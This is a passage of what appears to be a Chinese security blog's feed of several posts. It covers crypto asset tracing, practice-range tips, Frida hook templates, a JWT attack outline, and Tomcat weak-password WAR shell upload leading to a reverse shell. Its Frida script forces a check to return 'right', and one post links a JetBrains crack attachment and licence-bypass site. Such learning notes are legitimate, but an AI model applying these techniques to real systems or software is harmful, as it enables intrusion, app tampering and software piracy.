与支付的来源</strong></h3><ul><li><strong>代币铸造</strong>：在去中心化应用（DApp）中，用户的资产可能通过代币铸造（minting）或购买（buying）获得。代币的来源通常通过智能合约中定义的规则来生成。例如，用户参与某个应用程序或游戏时，可能会通过完成任务、购买、参与流动性挖矿等方式获得资产（比如代币或NFT）。在这种情况下，合约会定义如何创建新资产并将其分配给用户。</li><li><strong>合约中记录的来源</strong>：某些合约会保存资产的来源，例如“通过某平台购买”、“通过某个合约奖励获得”或“通过参与某个活动”获得。</li></ul><h3 id="4-第三方服务提供的交易历史"><a href="#4-第三方服务提供的交易历史" class="headerlink" title="4. 第三方服务提供的交易历史"></a>4. <strong>第三方服务提供的交易历史</strong></h3><ul><li><strong>交易所记录</strong>：如果用户的资产来自中心化交易所（CEX），则交易所通常会记录用户的存取款历史。例如，如果用户从交易所充值了资产，交易所会记录该用户的充值交易。对于去中心化交易所（DEX），链上也会显示资金流动，但资金的初始来源（例如用户是否曾在某个中心化平台交易）通常不会直接显示在链上。</li><li><strong>跨平台追踪</strong>：在跨平台的操作中，例如一个用户从一个链上资产转到另一个链，资产的来源可以通过链上或跨链的桥接（bridge）协议进行追溯。</li></ul><h3 id="5-合约事件与日志"><a href="#5-合约事件与日志" class="headerlink" title="5. 合约事件与日志"></a>5. <strong>合约事件与日志</strong></h3><ul><li><strong>事件日志</strong>：在智能合约中，通常会使用 <code>event</code> 来记录重要操作。通过这些事件日志，开发者和用户可以追踪资产的来源。例如，合约可以在发行代币时发出事件，表明资产的铸造和转账过程。这些事件日志可以在区块链浏览器（如 Etherscan）中查看，进一步帮助追溯资产的来源。</li></ul><h3 id="示例：代币转移与初始来源"><a href="#示例：代币转移与初始来源" class="headerlink" title="示例：代币转移与初始来源"></a>示例：代币转移与初始来源</h3><p>假设一个用户从某个智能合约中购买了代币或资产，以下是这个过程的追溯方式：</p><ol><li><strong>用户购买代币</strong>：用户通过合约购买某种代币，合约会记录代币的发放，更新用户的余额。</li><li><strong>查看代币转账历史</strong>：通过查看智能合约的交易历史（例如 ERC-20 代币的 <code>Transfer</code> 事件），你可以看到代币的发放来源、金额以及时间戳。</li><li><strong>追溯源头</strong>：你还可以通过钱包地址追溯资金的来源。如果该用户的地址曾经接收到某个区块链钱包的充值或某个代币的发行，你可以继续追溯到源头。</li></ol><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>区块链的透明性让你能够追溯用户资产的来源，但这需要你查阅区块链上的交易记录、智能合约事件和代币的发行历史。对于资产的“初始来源”，你可能需要通过用户的交易历史来追溯，也可以通过合约逻辑了解资产如何生成或转移。尽管区块链上的数据是公开的，但智能合约和资产的来源通常是间接记录的，需要通过相关的交易和事件日志来进行追溯。</p><p>. 从中心化交易所（CEX）购买<br>如果你刚接触区块链和加密货币，最简单的方式是通过中心化交易所（如 Coinbase、Binance、KuCoin、OKEx 等）购买加密资产。这里是一个简要的步骤：</p><p>注册交易所账户：在一个中心化交易所注册账户，并进行身份验证（KYC）。<br>充值法币：将你的法币（例如 USD、EUR、CNY 等）存入交易所账户。通常可以通过银行转账、信用卡或其他支付方式进行充值。<br>购买加密货币：使用你的法币购买加密货币（如比特币 BTC、以太坊 ETH、USDT 稳定币等）。你可以选择通过市场价直接购买，或者设定价格购买。<br>提现到钱包：购买加密货币后，你可以将其从交易所提取到你的个人钱包中。这样，你可以将资产控制在自己手中，避免交易所的风险。<br>一旦你有了这些加密资产，就可以在去中心化平台或智能合约中进行交易或购买商品。</p><ol start="2"><li>从去中心化交易所（DEX）交换资产<br>去中心化交易所（如 Uniswap、Sushiswap、PancakeSwap）允许你无需中介即可直接与其他用户交换资产。以下是通过 DEX 交换资产的过程：</li></ol><p>安装数字钱包：首先，你需要一个支持 Web3 的数字钱包（如 MetaMask、Trust Wallet 或 Coinbase Wallet）。<br>连接钱包：将你的钱包与 DEX 连接。一般来说，去中心化交易所会提供一个“连接钱包”的按钮，点击后选择你的钱包。<br>获取加密资产：你可以使用你的现有加密货币（如 ETH 或 USDT）交换其他资产（如你想购买的代币）。比如，你可以通过 Uniswap 用 ETH 交换代币。<br>进行交易：在 DEX 上找到你想交易的资产对，并提交交易。交易成功后，资产将直接转入你的钱包。<br>3. 参与去中心化金融（DeFi）平台<br>如果你已经拥有一些加密资产，并希望通过去中心化平台赚取更多资产（例如通过质押、借贷等方式），你可以参与 DeFi 服务。这些平台通常允许用户通过质押加密资产来获得利息或奖励代币，间接为你提供更多资产。</p><p>使用 DeFi 协议：例如，你可以使用 Compound、Aave、Yearn 等 DeFi 协议，将你的加密资产存入这些平台，获取利息或代币奖励。<br>借贷资产：你还可以通过 DeFi 借贷平台借取加密资产。例如，Aave 和 Compound 都允许你将加密货币作为抵押品进行借款。<br>4. 参加空投（Airdrop）<br>一些新兴的加密项目会通过空投向用户免费赠送代币。这些代币可以用来购买商品、服务或参与 DeFi 操作。空投通常需要你完成一些简单的任务，如关注社交媒体账号、加入社区、参与测试网等。</p><p>关注空投项目：你可以关注一些加密货币的空投网站（例如 AirdropAlert、CoinMarketCap 的 Airdrop 页面等），查看有哪些新项目正在进行空投。<br>参与任务：根据项目要求参与空投任务，完成任务后，你将获得免费的代币。<br>5. 工作赚取加密资产<br>一些平台和个人雇主提供加密货币支付，允许你通过工作赚取加密资产。你可以为提供加密货币支付的公司或平台提供服务（例如编程、设计、写作等），赚取比特币、以太坊等加密货币。</p><p>寻找加密货币工作：可以通过网站如 CryptoJobs、Freelancer、Upwork 等找到加密货币支付的工作。<br>6. 通过挖矿获得资产<br>如果你具备一定的技术条件和硬件设备，也可以通过挖矿来获取加密资产。挖矿是通过为区块链网络提供计算力，帮助验证交易并产生新区块来获得奖励的过程。</p><p>选择挖矿项目：常见的挖矿项目包括比特币、以太坊（ETH）等。你需要配置矿机并选择适合的挖矿池来参与。<br>加入矿池：如果你不是独立矿工，你可以加入矿池。矿池会将多个矿工的计算力合并，共同挖掘区块，并根据贡献的计算力分配奖励。<br>7. 使用信用卡购买加密资产<br>如果你希望快速获得初始资产并直接购买加密货币，一些平台允许你通过信用卡购买加密货币。例如，Coinbase、Binance 和其他平台支持通过信用卡或借记卡购买比特币、以太坊等加密货币。</p><p>选择信用卡支付平台：选择一个支持信用卡购买加密资产的平台，注册并验证你的身份，然后直接使用信用卡购买你需要的资产。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web3 </tag>
            
            <tag> Solidity </tag>
            
            <tag> 智能合约 </tag>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chemistry-hack-the-box</title>
      <link href="/2024/11/13/2024-10-20-hackthebox-Chemistry/"/>
      <url>/2024/11/13/2024-10-20-hackthebox-Chemistry/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="eee8f3c8bdd074e61a1af6a2bb9e72fb4a3438163f0ec98f9cbbe9144b6d4c3c">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259699c2d6ef5e789525c7bdb6840d2800245aced0f0832d6b0364efdccd46947f9486ee9aabfafffab3531a50d271fb02e34df4d67a4230463d4fd4a1cdd1804140a044b86f6009fee8ca322eb93ad451b6606c9865fc8ebb304b0cdbbb538d7e573d9cad54039daf9fcce3f54d601af49d5f26dca0a38b9f31f042417eef5b8ac14ee83e07090bc21911cb321c3c95abb92e5412183594a84b30ef3de3a85a1c37f7d355c760b2df8808ec36b28bce39b3ed346728326f1baa22d338fbeb38d57a9b724994e91b58b6ef1137d0a1aa8b644da9cfd7aedf6783b68138e90e8726e564a2c8ef2da2ee9099ff4dd5da566d40e08bde3feef26c1da377c6f2a1f8c2c0e93e2eb005bbc567b51850808455cb93ecebe5cadc7b0d6bc27041cd21e1ac541caa8eb1c0fe7be46bf5b673ad3e09fd966a579b77f58dc87e9d149948c794d1d4053daa07e08a54538acf605f22029ae82550b8462ae6094d377ad40f84f44fde722eb8ca2ef7d3ade2c188362976f1c6ec4cf9aa0189c5fba15b7c514b6c9f92be2381422b94559acfbaebd7a6fa605994c6eae1b0cb8ec9803250669bb237469564945cd738dae435fa01d53c04c3cfade35ff90e3148ad30c9280004fba656252439e868e91bcaa5a5142bc2c6a9c3d7ed67219c8b42fbb795bab3aed623e83ad361014614ea56de01bee98e95fb014474a944c15d91845428602f2f3294ff4042050be89a332f936ac5f055f090d69e021d3aa52d2976e2fa6e70948a3af874498cd3d95d10cd9ce4790e509e9f87e02901dba9a438794081daa12cfac5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> htb </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全打靶总结</title>
      <link href="/2024/11/13/2024-10-17-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%89%93%E9%9D%B6%E6%80%BB%E7%BB%93/"/>
      <url>/2024/11/13/2024-10-17-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%89%93%E9%9D%B6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="靶场平台"><a href="#靶场平台" class="headerlink" title="靶场平台"></a>靶场平台</h2><p>这里重要练习的靶场有:</p><table><thead><tr><th>靶场</th><th>推荐指数</th><th>评价</th></tr></thead><tbody><tr><td>Hack The Box</td><td>⭐⭐⭐⭐⭐</td><td>内容难度中, 完整的攻击流程 从webshell到rootshell，有赛季靶场基本一周一个，互联网上基本没有wp, 全靠自己, 容易放弃</td></tr><tr><td>VulnHub</td><td>⭐⭐⭐⭐</td><td>OFFSEC维护，现在没啥新出的靶场了，但是历史靶场有好多思路可以参考</td></tr><tr><td>TryHackMe</td><td>⭐⭐⭐⭐</td><td>这里我只是使用的在线攻击机和靶场，openvpn在我这里网络有问题还没解决，知道的可以留言，请教一下，顺便说一下它家的知识文档挺好的，可以当作知识库</td></tr><tr><td>OverTheWire</td><td>⭐⭐</td><td>适合初学者, 有很多靶场, 有很多靶场有详细的攻击流程</td></tr><tr><td>RootMe</td><td>⭐⭐</td><td>有很多靶场, 有很多靶场有详细的攻击流程, 类似CTF平台不太推荐</td></tr><tr><td>春秋云镜</td><td>⭐⭐⭐</td><td>国内平台，还不错，免费的漏洞环境，可以复现，复杂的靶场需要收费</td></tr></tbody></table><p>攻击流程都是大致都是一样的，看的就是细心和基础。以HACKTHEBOX为列，如何入门.</p><h2 id="Hack-The-Box"><a href="#Hack-The-Box" class="headerlink" title="Hack The Box"></a>Hack The Box</h2><p><a href="/../assets/img/image-117.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-117.png" alt="alt text"></a></p><hr><ol><li>Season 6 就是第6赛季，每个月都要免费的机器可以pwn</li><li>machines 各种靶场，有难易都有，有的靶场有详细的攻击流程，有的没有</li><li>Prolab 在真实的企业环境中进行交互式黑客培训。</li><li>challenges 偏向CTF, 脑洞比较大，不太推荐</li><li>sherlocks 应急响应和安全溯源</li></ol><hr><h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><ol><li>网络问题，可以使用代理计算器，把openvpn的流量转发到代理服务器，加速扫描</li></ol><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol><li>信息搜集</li><li>漏洞利用</li><li>权限提升</li><li>痕迹清理</li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> HTB </tag>
            
            <tag> OFFSEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frida的一些模板和配置及一些场景目录和问题记录</title>
      <link href="/2024/11/13/2024-11-08-Frida-Template/"/>
      <url>/2024/11/13/2024-11-08-Frida-Template/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>本文主要记录了Frida的一些模板和配置及一些场景目录和问题记录<br>前提是已经安装了Frida，查看其他文章</p></blockquote><h1 id="启动和配置"><a href="#启动和配置" class="headerlink" title="启动和配置"></a>启动和配置</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /data/local/tmp</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 修改 文件 权限</span></span><br><span class="line"><span class="built_in">chmod</span> 755 frida-server</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 运行文件</span></span><br><span class="line">./frida-server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br><span class="line"></span><br><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><h1 id="Frida的一些模板和配置"><a href="#Frida的一些模板和配置" class="headerlink" title="Frida的一些模板和配置"></a>Frida的一些模板和配置</h1><h2 id="python模板"><a href="#python模板" class="headerlink" title="python模板"></a>python模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义消息回调函数，接收 Frida 脚本发送的消息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&quot;payload&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用包名来附加目标应用并执行 JS 代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_target_application</span>(<span class="params">app_name, js_file</span>):</span><br><span class="line">    <span class="comment"># JavaScript 脚本内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(js_file, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">        script_source = fin.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 USB 设备并通过包名附加到目标应用</span></span><br><span class="line">    <span class="comment"># 也可以使用进程id</span></span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pid = device.spawn(package_name)</span></span><br><span class="line">    <span class="comment"># print(pid)</span></span><br><span class="line">    process = device.attach(app_name)</span><br><span class="line">    <span class="comment"># 创建并加载脚本</span></span><br><span class="line">    script = process.create_script(script_source)</span><br><span class="line">    script.on(<span class="string">&quot;message&quot;</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待用户输入停止信号</span></span><br><span class="line">    sys.stdin.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 卸载脚本并分离进程</span></span><br><span class="line">    script.unload()</span><br><span class="line">    process.detach()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 设置目标应用的包名</span></span><br><span class="line">    app_name = <span class="string">&quot;My Application&quot;</span></span><br><span class="line"> </span><br><span class="line">    js_file = <span class="string">&quot;scripts/js_file.js&quot;</span></span><br><span class="line">    <span class="comment"># 调用函数进行 hook</span></span><br><span class="line">    hook_target_application(app_name, js_file)</span><br></pre></td></tr></table></figure><h2 id="js模板"><a href="#js模板" class="headerlink" title="js模板"></a>js模板</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 获取 JNI 类</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Activity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.myapplication.MainActivity&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重写 getResult 方法</span></span><br><span class="line">    <span class="title class_">Activity</span>.<span class="property">check</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getResult called with:&#x27;</span>, str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用原始方法</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">check</span>(str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getResult returned:&#x27;</span>, result);</span><br><span class="line">        <span class="comment">// 返回原始结果</span></span><br><span class="line">        result = <span class="string">&quot;right&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>有这样一个场景 打开闪退<br>所以需要frida进行自启动app</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm list packages|findstr che</span><br><span class="line"></span><br><span class="line">frida -U -f com.chehejia.oc.m01 -l hook.js</span><br></pre></td></tr></table></figure><h2 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h2><p><code>process = device.attach(app_name)</code> 如果使用包名的话，会报错，需要使用进程id或者应用名称</p><h2 id="Github也有这个issue"><a href="#Github也有这个issue" class="headerlink" title="Github也有这个issue?"></a>Github也有这个issue?</h2><p><a href="/../assets/img/image-120.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-120.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APP逆向 </tag>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT专题</title>
      <link href="/2024/11/13/2024-10-13-JWT%E4%B8%93%E9%A2%98/"/>
      <url>/2024/11/13/2024-10-13-JWT%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>json web token</p><ol><li>登录 -&gt; server</li><li>token</li><li>send auth-head:token</li><li>head.payload.sign<br> head{alg,type,option}<br> payload {身份信息}<br>exp:</li><li>空加密</li><li>未校验签名</li><li>爆破密钥</li><li>kid 注入</li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> JWT </tag>
            
            <tag> 认证 </tag>
            
            <tag> 授权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web中间件-Tomcat8</title>
      <link href="/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/"/>
      <url>/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><ol><li>界面<br><a href="/../assets/img/image-107.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-107.png" alt="alt text"></a></li><li>manager 弱口令<br><a href="/../assets/img/image-108.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-108.png" alt="alt text"></a></li><li>上传 war 包<br>直接将shell.jsp压缩，修改后缀为.war即可上传<br><a href="/../assets/img/image-109.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-109.png" alt="alt text"></a></li><li>反弹shell<br><a href="/../assets/img/image-110.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-110.png" alt="alt text"></a><br>意思是在shell文件下的shell.jsp</li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web中间件 </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MonitorsThree</title>
      <link href="/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/"/>
      <url>/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="c0eb4cf71f1a2148d86a8016569088f65684e133334cae32b23bdf32cdc6ee7b">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259614437644d13c3b329af8fec292588f08255a9c57c03c7bbae47bfc8af8a04648593c61c347cfcf35c63b8a4e06256700a6882fc9a7a1d22e88723d69ff3adb295e1413ff7b0190229f531d1e91730f44f808e01f508f8c3e44e6bf6e71af5d8613bf9540b2396c0b51787c349bedbef2d28c848814c7f02183ce29ce4e8c00b7e54981558066e17a990b1442a970a53db3f88b126351504b1e21456cae198d37830c62866b2e509455cca5e9942ba48fb66ff9510c76aa50d4d659e1e86556efeb97e396a3cf34157995b652d5d49e881f5bdea12225b57bb917b57a30a2129d2da5f9b3455b1d3d2a03543de7ae62f82e56726513c7d7090cfd4024db9dbeb5c841399dc406d9d63d1c0d5d7f4d627b6e6b437d5200d55eb8a8e60a4a16137285d64d47149b5099111be904a1f6dccafdc6ee04f79f7dcbe2d38a06ac32aae914afde949ffa7983958de7842588df0a4b67f558c3a2a4df99105cad96f157f13a596be1fc64d10c392130d4624977869102b0d4f70cc0317c3f08a844bb9db3671a1c3200b9825c3a317b2d1f7043a59dce5ab58b0f3754ca387e759aceee4b474fcd1d8890a6ef42a2e28347a5c8405503cb47784fe1db3ea94eb7d49237daf4ef0b14662f21d15fb1fca2995ce469bda6e92f6ea63f26343a7d616da1bb9f8b4ba4959b717dbffcef7af823f5c77887d3012b03eef30a1d32970a8f6ef7670406eb1cf3fe655862f4825aa9dcb42cc10a18f57a3ad31b5d448bf714daff18add8004101dfee9c58d77c42d2cea3cabcda43d1c0761d6ddb7f573c3d5756eb1e442a34b3c43fac9208765e268d0417097db5bf300c580fcc9558ff2947935ae2f4185ff3b226d27b930d77a9d1bde1b1fc47978a811a802724f0298c029f444a46288e6f7d44fdc5385b5e74fd4e303b78ab309b293313755146e7ed4708bc3a26fcc5e2a313bac2a6978b5abc7c73</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> THB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JB全家桶破解指南</title>
      <link href="/2024/11/13/2024-09-27-jb-crack-tools/"/>
      <url>/2024/11/13/2024-09-27-jb-crack-tools/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>里面下载附件</p><p><a href="/assets/file/win2021-2024.zip" target="_blank">附件</a></p><h2 id="地区不要选择中国"><a href="#地区不要选择中国" class="headerlink" title="地区不要选择中国"></a>地区不要选择中国</h2><p><a href="https://3.jetbra.in/">https://3.jetbra.in/</a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> JetBrains </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTB-caption</title>
      <link href="/2024/11/13/2024-09-21-caption/"/>
      <url>/2024/11/13/2024-09-21-caption/</url>
      
